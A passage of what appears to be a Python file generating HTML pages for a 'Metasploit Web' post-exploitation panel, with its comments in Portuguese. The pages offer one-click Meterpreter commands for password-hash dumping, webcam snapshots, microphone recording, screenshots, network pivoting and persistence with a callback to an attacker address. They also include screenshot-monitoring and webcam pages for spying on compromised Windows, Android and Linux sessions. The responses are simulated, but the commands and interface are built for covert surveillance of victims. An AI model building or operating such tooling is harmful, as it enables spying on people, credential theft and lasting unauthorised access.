                    <button class="btn" onclick="runCommand('run post/windows/gather/smart_hashdump')">Smart Dump</button>
                </div>
            </div>

            <div class="tool-card">
                <div class="tool-icon">🎤</div>
                <h3>Audio Capture</h3>
                <p class="tool-description">Record microphone audio</p>
                <div class="tool-actions">
                    <button class="btn" onclick="recordAudio(30)">Record 30s</button>
                    <button class="btn" onclick="recordAudio(60)">Record 1m</button>
                </div>
            </div>

            <div class="tool-card">
                <div class="tool-icon">📷</div>
                <h3>Webcam Capture</h3>
                <p class="tool-description">Take pictures from webcam</p>
                <div class="tool-actions">
                    <button class="btn" onclick="runCommand('webcam_list')">List Cams</button>
                    <button class="btn" onclick="runCommand('webcam_snap')">Take Picture</button>
                </div>
            </div>

            <div class="tool-card">
                <div class="tool-icon">🖥️</div>
                <h3>Screenshot</h3>
                <p class="tool-description">Capture desktop screenshots</p>
                <div class="tool-actions">
                    <button class="btn" onclick="runCommand('screenshot')">Take Screenshot</button>
                </div>
            </div>

            <div class="tool-card">
                <div class="tool-icon">📡</div>
                <h3>Pivoting</h3>
                <p class="tool-description">Network pivoting and port forwarding</p>
                <div class="tool-actions">
                    <button class="btn" onclick="runCommand('run autoroute -s 192.168.1.0/24')">Add Route</button>
                    <button class="btn" onclick="runCommand('portfwd add -L 8080 -p 80 -r 192.168.1.50')">Port Forward</button>
                </div>
            </div>

            <div class="tool-card">
                <div class="tool-icon">⚡</div>
                <h3>Persistence</h3>
                <p class="tool-description">Maintain access to compromised systems</p>
                <div class="tool-actions">
                    <button class="btn" onclick="runCommand('run persistence -X -i 30 -p 443 -r 192.168.1.100')">Add Persistence</button>
                    <button class="btn" onclick="runCommand('run post/windows/manage/multi_meterpreter_inject')">Inject Meterpreter</button>
                </div>
            </div>
        </div>

        <div class="output-panel">
            <div class="panel-header">
                <h3>📋 Command Output</h3>
            </div>
            <div class="output-terminal" id="output-terminal">
                <div>Select a session and run commands to see output here...</div>
            </div>
        </div>
    </div>

    <script>
        function runCommand(command) {
            const session = document.getElementById('target-session').value;
            if (!session) {
                alert('Please select a target session first');
                return;
            }

            const output = document.getElementById('output-terminal');
            
            // Adicionar comando ao output
            const commandLine = document.createElement('div');
            commandLine.innerHTML = `<span style="color: var(--hacker-blue);">session ${session} ></span> ${command}`;
            output.appendChild(commandLine);

            // Simular resposta
            setTimeout(() => {
                const response = document.createElement('div');
                response.style.color = 'var(--hacker-green)';
                
                // Respostas simuladas para comandos comuns
                if (command === 'sysinfo') {
                    response.innerHTML = `
                        Computer        : DESKTOP-${Math.random().toString(36).substr(2, 5).toUpperCase()}<br>
                        OS              : Windows 10 (Build 19043)<br>
                        Architecture    : x64<br>
                        System Language : en_US<br>
                        Domain          : WORKGROUP<br>
                        Logged On Users : 2<br>
                        Meterpreter     : x64/windows
                    `;
                } else if (command === 'ifconfig') {
                    response.innerHTML = `
                        Interface 1<br>
                        ==========<br>
                        Name         : Ethernet0<br>
                        Hardware MAC : 00:${Array.from({length: 5}, () => Math.floor(Math.random()*256).toString(16).padStart(2, '0')).join(':')}<br>
                        IPv4 Address : 192.168.1.${100 + parseInt(session)}<br>
                        IPv4 Netmask : 255.255.255.0<br>
                    `;
                } else if (command === 'getuid') {
                    response.textContent = `Server username: ${session === '1' ? 'DESKTOP-ADMIN\\admin' : session === '2' ? 'root' : 'shell'}`;
                } else if (command === 'pwd') {
                    response.textContent = session === '1' ? 'C:\\Users\\admin' : session === '2' ? '/root' : '/data/data/com.termux';
                } else if (command === 'ls') {
                    response.textContent = 'file1.txt  file2.exe  documents/  downloads/';
                } else {
                    response.textContent = `Command '${command}' executed successfully in session ${session}`;
                }
                
                output.appendChild(response);
                output.scrollTop = output.scrollHeight;
            }, 1000);
        }

        function recordAudio(duration) {
            const session = document.getElementById('target-session').value;
            if (!session) {
                alert('Please select a target session first');
                return;
            }

            const output = document.getElementById('output-terminal');
            
            const commandLine = document.createElement('div');
            commandLine.innerHTML = `<span style="color: var(--hacker-blue);">session ${session} ></span> record_mic -d ${duration}`;
            output.appendChild(commandLine);

            setTimeout(() => {
                const response = document.createElement('div');
                response.style.color = 'var(--hacker-green)';
                response.textContent = `Audio recording started for ${duration} seconds...`;
                output.appendChild(response);
                output.scrollTop = output.scrollHeight;
            }, 500);

            setTimeout(() => {
                const completion = document.createElement('div');
                completion.style.color = 'var(--hacker-green)';
                completion.textContent = `Audio recording saved: audio_${session}_${Date.now()}.wav`;
                output.appendChild(completion);
                output.scrollTop = output.scrollHeight;
            }, duration * 1000 + 500);
        }

        // Permitir Enter no seletor de sessão para focar no output
        document.getElementById('target-session').addEventListener('change', function() {
            const output = document.getElementById('output-terminal');
            output.innerHTML = `<div>Session ${this.value} selected for post-exploitation</div>`;
        });
    </script>
</body>
</html>
"""

    def generate_webcam_html(self):
        """Controle de webcam"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam Control - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .webcam-controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }

        .control-panel, .video-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
        }

        .session-selector {
            margin-bottom: 20px;
        }

        .session-selector select {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .webcam-actions {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }

        .action-btn {
            background: transparent;
            border: 2px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 12px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }

        .action-btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .action-btn.recording {
            border-color: #ff0000;
            color: #ff0000;
            animation: pulse 1s infinite;
        }

        .action-btn.recording:hover {
            background: #ff0000;
            color: var(--dark-bg);
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .video-feed {
            background: #000;
            border: 2px solid var(--hacker-green);
            border-radius: 10px;
            height: 400px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }

        .video-placeholder {
            text-align: center;
            color: #666;
        }

        .webcam-status {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
        }

        .status-online {
            color: var(--hacker-green);
        }

        .status-offline {
            color: #ff0000;
        }

        .recordings-list {
            max-height: 200px;
            overflow-y: auto;
            margin-top: 20px;
        }

        .recording-item {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            padding: 10px;
            margin-bottom: 5px;
            border-radius: 3px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .live-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #ff0000;
            margin-right: 10px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">WEBCAM CONTROL</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/screenshots" class="nav-btn">Screenshots</a>
                <a href="/audio" class="nav-btn">Audio</a>
            </nav>
        </header>

        <div class="webcam-controls">
            <div class="control-panel">
                <div class="panel-header">
                    <h3>🎮 Webcam Controls</h3>
                </div>

                <div class="session-selector">
                    <label>Select Session:</label>
                    <select id="webcam-session">
                        <option value="">Select a session...</option>
                        <option value="1">Session 1 - Windows (192.168.1.100)</option>
                        <option value="2">Session 2 - Android (192.168.1.101)</option>
                        <option value="3">Session 3 - Linux (192.168.1.102)</option>
                    </select>
                </div>

                <div class="webcam-actions">
                    <button class="action-btn" onclick="startWebcam()" id="start-btn">
                        📷 Start Webcam
                    </button>
                    <button class="action-btn" onclick="stopWebcam()" id="stop-btn" disabled>
                        ⏹️ Stop Webcam
                    </button>
                    <button class="action-btn" onclick="takeSnapshot()">
                        📸 Take Snapshot
                    </button>
                    <button class="action-btn" onclick="startRecording()" id="record-btn">
                        🎥 Start Recording
                    </button>
                </div>

                <div class="webcam-status">
                    <h4>Status:</h4>
                    <div id="webcam-status-text" class="status-offline">Webcam offline</div>
                    <div id="webcam-info" style="margin-top: 10px; font-size: 0.9em;">
                        Select a session and start webcam feed
                    </div>
                </div>

                <div class="recordings-list">
                    <h4>Recent Captures:</h4>
                    <div class="recording-item">
                        <span>webcam_1_20241201_120030.jpg</span>
                        <button class="action-btn" style="padding: 5px 10px;">Download</button>
                    </div>
                    <div class="recording-item">
                        <span>webcam_2_20241201_115945.jpg</span>
                        <button class="action-btn" style="padding: 5px 10px;">Download</button>
                    </div>
                </div>
            </div>

            <div class="video-panel">
                <div class="panel-header">
                    <h3>📹 Live Feed</h3>
                    <span id="live-indicator" style="color: #ff0000; font-size: 0.8em;">
                        ● LIVE
                    </span>
                </div>

                <div class="video-feed" id="video-feed">
                    <div class="video-placeholder" id="video-placeholder">
                        <div style="font-size: 3em; margin-bottom: 20px;">📷</div>
                        <div>Webcam feed will appear here</div>
                        <div style="font-size: 0.8em; margin-top: 10px; color: #666;">
                            Select a session and start webcam
                        </div>
                    </div>
                    <canvas id="webcam-canvas" style="display: none; max-width: 100%; max-height: 100%;"></canvas>
                </div>

                <div style="text-align: center;">
                    <div style="display: inline-block; background: #ff0000; color: white; padding: 5px 15px; border-radius: 20px; font-size: 0.8em;">
                        <span class="live-indicator"></span>
                        RECORDING
                    </div>
                </div>

                <div style="margin-top: 20px;">
                    <h4>Webcam Information:</h4>
                    <div id="camera-info" style="font-size: 0.9em; color: #888;">
                        No camera information available
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let isWebcamActive = false;
        let isRecording = false;
        let webcamInterval;

        function startWebcam() {
            const session = document.getElementById('webcam-session').value;
            if (!session) {
                alert('Please select a session first');
                return;
            }

            const videoFeed = document.getElementById('video-feed');
            const placeholder = document.getElementById('video-placeholder');
            const canvas = document.getElementById('webcam-canvas');
            const statusText = document.getElementById('webcam-status-text');
            const startBtn = document.getElementById('start-btn');
            const stopBtn = document.getElementById('stop-btn');

            // Simular início da webcam
            placeholder.style.display = 'none';
            canvas.style.display = 'block';
            statusText.textContent = 'Webcam active - Session ' + session;
            statusText.className = 'status-online';
            startBtn.disabled = true;
            stopBtn.disabled = false;

            isWebcamActive = true;

            // Simular feed de vídeo
            simulateVideoFeed();

            // Atualizar informações da câmera
            document.getElementById('camera-info').innerHTML = `
                <div>Session: ${session}</div>
                <div>Resolution: 1280x720</div>
                <div>FPS: 30</div>
                <div>Status: <span style="color: #00ff00;">Active</span></div>
            `;
        }

        function stopWebcam() {
            const placeholder = document.getElementById('video-placeholder');
            const canvas = document.getElementById('webcam-canvas');
            const statusText = document.getElementById('webcam-status-text');
            const startBtn = document.getElementById('start-btn');
            const stopBtn = document.getElementById('stop-btn');

            placeholder.style.display = 'flex';
            canvas.style.display = 'none';
            statusText.textContent = 'Webcam offline';
            statusText.className = 'status-offline';
            startBtn.disabled = false;
            stopBtn.disabled = true;

            isWebcamActive = false;
            clearInterval(webcamInterval);

            document.getElementById('camera-info').innerHTML = 'No camera information available';
        }

        function takeSnapshot() {
            if (!isWebcamActive) {
                alert('Start webcam first');
                return;
            }

            // Simular captura de snapshot
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `webcam_snapshot_${timestamp}.jpg`;
            
            alert(`Snapshot captured: ${filename}`);
            
            // Adicionar à lista de capturas
            const recordingsList = document.querySelector('.recordings-list');
            const newItem = document.createElement('div');
            newItem.className = 'recording-item';
            newItem.innerHTML = `
                <span>${filename}</span>
                <button class="action-btn" style="padding: 5px 10px;">Download</button>
            `;
            recordingsList.appendChild(newItem);
        }

        function startRecording() {
            if (!isWebcamActive) {
                alert('Start webcam first');
                return;
            }

            const recordBtn = document.getElementById('record-btn');
            
            if (!isRecording) {
                isRecording = true;
                recordBtn.textContent = '⏹️ Stop Recording';
                recordBtn.classList.add('recording');
                
                // Simular gravação
                alert('Webcam recording started...');
            } else {
                isRecording = false;
                recordBtn.textContent = '🎥 Start Recording';
                recordBtn.classList.remove('recording');
                
                // Simular fim da gravação
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                const filename = `webcam_recording_${timestamp}.avi`;
                alert(`Recording saved: ${filename}`);
            }
        }

        function simulateVideoFeed() {
            const canvas = document.getElementById('webcam-canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = 640;
            canvas.height = 480;

            let frameCount = 0;

            webcamInterval = setInterval(() => {
                // Limpar canvas
                ctx.fillStyle = '#001100';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Desenhar um retângulo verde para simular o feed
                ctx.strokeStyle = '#00ff00';
                ctx.lineWidth = 2;
                ctx.strokeRect(10, 10, canvas.width - 20, canvas.height - 20);
                
                // Adicionar algum texto
                ctx.fillStyle = '#00ff00';
                ctx.font = '14px Courier New';
                ctx.fillText('WEBCAM FEED SIMULATION', 50, 50);
                ctx.fillText(`Frame: ${frameCount++}`, 50, 80);
                ctx.fillText('Session: ' + document.getElementById('webcam-session').value, 50, 110);
                ctx.fillText('Time: ' + new Date().toLocaleTimeString(), 50, 140);
                
                // Adicionar algum efeito visual
                for (let i = 0; i < 10; i++) {
                    const x = Math.random() * canvas.width;
                    const y = Math.random() * canvas.height;
                    ctx.fillStyle = `rgba(0, 255, 0, ${Math.random() * 0.3})`;
                    ctx.fillRect(x, y, 2, 2);
                }
            }, 1000 / 30); // 30 FPS
        }

        // Atualizar informações quando a sessão mudar
        document.getElementById('webcam-session').addEventListener('change', function() {
            if (isWebcamActive) {
                stopWebcam();
            }
        });
    </script>
</body>
</html>
"""

    def generate_screenshots_html(self):
        """Gerenciador de screenshots"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screenshots - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .screenshots-interface {
            display: grid;
            grid-template-columns: 300px 1fr;
            gap: 30px;
        }

        .control-panel, .gallery-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
        }

        .session-selector {
            margin-bottom: 20px;
        }

        .session-selector select {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .screenshot-actions {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 20px;
        }

        .action-btn {
            background: transparent;
            border: 2px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 12px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }

        .action-btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .action-btn.capture {
            border-color: var(--hacker-purple);
            color: var(--hacker-purple);
        }

        .action-btn.capture:hover {
            background: var(--hacker-purple);
            color: var(--dark-bg);
        }

        .sessions-list {
            max-height: 300px;
            overflow-y: auto;
            margin-top: 20px;
        }

        .session-item {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .session-item:hover {
            border-color: var(--hacker-blue);
        }

        .session-item.active {
            border-color: var(--hacker-green);
            background: #001100;
        }

        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 15px;
            max-height: 600px;
            overflow-y: auto;
        }

        .screenshot-item {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            border-radius: 8px;
            overflow: hidden;
            transition: all 0.3s;
        }

        .screenshot-item:hover {
            border-color: var(--hacker-blue);
            transform: translateY(-5px);
        }

        .screenshot-img {
            width: 100%;
            height: 150px;
            background: linear-gradient(45deg, #001100, #000811);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--hacker-green);
            font-size: 0.9em;
            text-align: center;
            padding: 10px;
        }

        .screenshot-info {
            padding: 10px;
            border-top: 1px solid var(--hacker-purple);
        }

        .screenshot-actions {
            display: flex;
            gap: 5px;
            margin-top: 10px;
        }

        .small-btn {
            background: transparent;
            border: 1px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 0.8em;
            transition: all 0.3s;
        }

        .small-btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .screenshot-viewer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .viewer-content {
            max-width: 90%;
            max-height: 90%;
            position: relative;
        }

        .viewer-img {
            max-width: 100%;
            max-height: 100%;
            border: 2px solid var(--hacker-green);
            border-radius: 10px;
        }

        .close-viewer {
            position: absolute;
            top: -40px;
            right: 0;
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">SCREENSHOTS MANAGER</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/webcam" class="nav-btn">Webcam</a>
                <a href="/audio" class="nav-btn">Audio</a>
            </nav>
        </header>

        <div class="screenshots-interface">
            <div class="control-panel">
                <div class="panel-header">
                    <h3>🎮 Screenshot Controls</h3>
                </div>

                <div class="session-selector">
                    <label>Active Sessions:</label>
                    <select id="screenshot-session">
                        <option value="">Select a session...</option>
                        <option value="1">Session 1 - Windows (admin@192.168.1.100)</option>
                        <option value="2">Session 2 - Android (root@192.168.1.101)</option>
                        <option value="3">Session 3 - Linux (user@192.168.1.102)</option>
                    </select>
                </div>

                <div class="screenshot-actions">
                    <button class="action-btn capture" onclick="takeScreenshot()">
                        📸 Take Screenshot
                    </button>
                    <button class="action-btn" onclick="takeMultipleScreenshots()">
                        🔄 Take Multiple (5)
                    </button>
                    <button class="action-btn" onclick="startScreenshotMonitor()">
                        👁️ Start Monitor
                    </button>
                    <button class="action-btn" onclick="clearScreenshots()">
                        🗑️ Clear All
                    </button>
                </div>

                <div class="sessions-list">
                    <div class="session-item active">
                        <strong>Session 1</strong><br>
                        Windows - 192.168.1.100<br>
                        User: admin<br>
                        <small>Last screenshot: 2 min ago</small>
                    </div>
                    <div class="session-item">
                        <strong>Session 2</strong><br>
                        Android - 192.168.1.101<br>
                        User: root<br>
                        <small>Last screenshot: 5 min ago</small>
                    </div>
                    <div class="session-item">
                        <strong>Session 3</strong><br>
                        Linux - 192.168.1.102<br>
                        User: user<br>
                        <small>No screenshots</small>
                    </div>
                </div>
            </div>

            <div class="gallery-panel">
                <div class="panel-header">
                    <h3>🖼️ Screenshot Gallery</h3>
                    <div style="font-size: 0.9em; color: var(--hacker-blue);">
                        Total: <span id="screenshot-count">6</span> images
                    </div>
                </div>

                <div class="gallery-grid" id="screenshot-gallery">
                    <!-- Screenshots will be loaded here -->
                </div>
            </div>
        </div>
    </div>

    <div class="screenshot-viewer" id="screenshot-viewer">
        <div class="viewer-content">
            <button class="close-viewer" onclick="closeViewer()">✕ Close</button>
            <div class="viewer-img" id="viewer-img">
                <!-- Image will be loaded here -->
            </div>
        </div>
    </div>

    <script>
        // Dados de exemplo para screenshots
        const sampleScreenshots = [
            {
                id: 1,
                session: 'Session 1',
                filename: 'screenshot_1_20241201_120030.jpg',
                timestamp: '2024-12-01 12:00:30',
                description: 'Windows Desktop - Active applications'
            },
            {
                id: 2,
                session: 'Session 1', 
                filename: 'screenshot_1_20241201_115945.jpg',
                timestamp: '2024-12-01 11:59:45',
                description: 'Browser with sensitive information'
            },
            {
                id: 3,
                session: 'Session 2',
                filename: 'screenshot_2_20241201_114520.jpg',
                timestamp: '2024-12-01 11:45:20',
                description: 'Android Home Screen'
            },
            {
                id: 4,
                session: 'Session 2',
                filename: 'screenshot_2_20241201_114015.jpg',
                timestamp: '2024-12-01 11:40:15',
                description: 'Android Messages App'
            },
            {
                id: 5,
                session: 'Session 1',
                filename: 'screenshot_1_20241201_113230.jpg',
                timestamp: '2024-12-01 11:32:30',
                description: 'File Explorer - Documents'
            },
            {
                id: 6,
                session: 'Session 3',
                filename: 'screenshot_3_20241201_112100.jpg',
                timestamp: '2024-12-01 11:21:00',
                description: 'Linux Terminal Session'
            }
        ];

        function loadScreenshotGallery() {
            const gallery = document.getElementById('screenshot-gallery');
            gallery.innerHTML = '';

            sampleScreenshots.forEach(screenshot => {
                const item = document.createElement('div');
                item.className = 'screenshot-item';
                item.innerHTML = `
                    <div class="screenshot-img" onclick="viewScreenshot(${screenshot.id})">
                        SCREENSHOT PREVIEW<br>
                        ${screenshot.session}<br>
                        ${screenshot.timestamp.split(' ')[1]}
                    </div>
                    <div class="screenshot-info">
                        <div style="font-weight: bold; margin-bottom: 5px;">${screenshot.filename}</div>
                        <div style="font-size: 0.8em; color: #888; margin-bottom: 5px;">
                            ${screenshot.timestamp}
                        </div>
                        <div style="font-size: 0.8em; margin-bottom: 10px;">
                            ${screenshot.description}
                        </div>
                        <div class="screenshot-actions">
                            <button class="small-btn" onclick="viewScreenshot(${screenshot.id})">View</button>
                            <button class="small-btn" onclick="downloadScreenshot(${screenshot.id})">Download</button>
                            <button class="small-btn" onclick="deleteScreenshot(${screenshot.id})">Delete</button>
                        </div>
                    </div>
                `;
                gallery.appendChild(item);
            });

            document.getElementById('screenshot-count').textContent = sampleScreenshots.length;
        }

        function takeScreenshot() {
            const session = document.getElementById('screenshot-session').value;
            if (!session) {
                alert('Please select a session first');
                return;
            }

            // Simular captura de screenshot
            const timestamp = new Date().toLocaleString('en-US', { 
                year: 'numeric', 
                month: '2-digit', 
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false 
            }).replace(/[/,]/g, '').replace(/ /g, '_');

            const newScreenshot = {
                id: sampleScreenshots.length + 1,
                session: `Session ${session}`,
                filename: `screenshot_${session}_${timestamp}.jpg`,
                timestamp: new Date().toLocaleString(),
                description: `Screenshot from Session ${session}`
            };

            sampleScreenshots.unshift(newScreenshot);
            loadScreenshotGallery();

            // Mostrar confirmação
            alert(`Screenshot captured from Session ${session}`);
        }

        function takeMultipleScreenshots() {
            const session = document.getElementById('screenshot-session').value;
            if (!session) {
                alert('Please select a session first');
                return;
            }

            alert(`Taking 5 screenshots from Session ${session}...`);
            
            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    takeScreenshot();
                }, i * 2000);
            }
        }

        function startScreenshotMonitor() {
            const session = document.getElementById('screenshot-session').value;
            if (!session) {
                alert('Please select a session first');
                return;
            }

            alert(`Starting screenshot monitor for Session ${session} (1 screenshot every 10 seconds)`);
            
            // Simular monitor contínuo
            const monitorInterval = setInterval(() => {
                if (confirm('Stop screenshot monitor?')) {
                    clearInterval(monitorInterval);
                    alert('Screenshot monitor stopped');
                } else {
                    takeScreenshot();
                }
            }, 10000);
        }

        function viewScreenshot(screenshotId) {
            const screenshot = sampleScreenshots.find(s => s.id === screenshotId);
            if (screenshot) {
                const viewer = document.getElementById('screenshot-viewer');
                const viewerImg = document.getElementById('viewer-img');
                
                // Simular imagem (em produção, carregaria a imagem real)
                viewerImg.innerHTML = `
                    <div style="background: #001100; padding: 50px; border-radius: 10px; text-align: center;">
                        <div style="font-size: 2em; margin-bottom: 20px;">🖼️</div>
                        <div style="font-size: 1.2em; margin-bottom: 10px;">${screenshot.filename}</div>
                        <div style="color: #888; margin-bottom: 20px;">${screenshot.timestamp}</div>
                        <div>${screenshot.description}</div>
                        <div style="margin-top: 30px; font-size: 0.9em; color: #666;">
                            Session: ${screenshot.session}<br>
                            Resolution: 1920x1080<br>
                            Size: 1.2 MB
                        </div>
                    </div>
                `;
                
                viewer.style.display = 'flex';
            }
        }

        function closeViewer() {
            document.getElementById('screenshot-viewer').style.display = 'none';
        }

        function downloadScreenshot(screenshotId) {
            const screenshot = sampleScreenshots.find(s => s.id === screenshotId);
            if (screenshot) {
                alert(`Downloading: ${screenshot.filename}`);
                // Em produção, faria o download real do arquivo
            }
        }

        function deleteScreenshot(screenshotId) {
            if (confirm('Are you sure you want to delete this screenshot?')) {
                const index = sampleScreenshots.findIndex(s => s.id === screenshotId);
                if (index !== -1) {
                    sampleScreenshots.splice(index, 1);
                    loadScreenshotGallery();
                    alert('Screenshot deleted');
                }
            }
        }

        function clearScreenshots() {
            if (confirm('Are you sure you want to delete ALL screenshots?')) {
                sampleScreenshots.length = 0;
                loadScreenshotGallery();
                alert('All screenshots cleared');
            }
        }

        // Inicializar gallery
        document.addEventListener('DOMContentLoaded', function() {
            loadScreenshotGallery();
            
            // Fechar viewer ao clicar fora
            document.getElementById('screenshot-viewer').addEventListener('click', function(e) {
                if (e.target === this) {
                    closeViewer();
                }
            });
        });
    </script>
</body>
</html>
"""

    def generate_audio_html(self):
        """Gerenciador de áudio"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Audio Recording - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .audio-interface {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }

        .control-panel, .recordings-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
        }

        .session-selector {
            margin-bottom: 20px;
        }

        .session-selector select {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .recording-controls {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }

        .action-btn {
            background: transparent;
            border: 2px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 12px;
